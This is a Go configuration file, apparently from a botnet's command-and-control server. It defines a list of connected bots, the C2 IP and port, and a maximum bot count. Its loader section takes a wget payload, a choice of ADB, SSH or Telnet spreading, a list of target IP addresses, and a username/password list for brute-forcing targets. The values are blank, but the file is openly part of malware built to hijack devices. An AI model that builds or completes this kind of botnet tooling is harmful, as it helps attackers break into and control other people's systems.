package config

import (
	"net"
)


/*
    *    util/config/config.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


var Bots []net.Conn /* Don't touch this! */
var BotCount int = 0 /* Don't touch this! */

/* Server Configuration */
const (
    C2_IP = "127.0.0.1" /* Server IP! */
    C2_PORT = "1337" /* Server Port! */
	MAX_BOTS = 1024 /* Max amount of bots allowed to connect to the server! */
)

/* Loader Configuration */
const (
    LOADER_ENABLE = false /* Set this to 'true' if you want to use the loader! */
    LOADER_PAYLOAD = "" /* Add your own custom wget payload here! */
    LOADER_OPTION = "" /* The options are '--adb', '--ssh', and '--telnet'! */
    LOADER_IP_LIST = "" /* Add your list containing the IP addresses of targets! */
    LOADER_BRUTE_LIST = "" /* Add your list containing the username/password combinations to brute against the target! */
)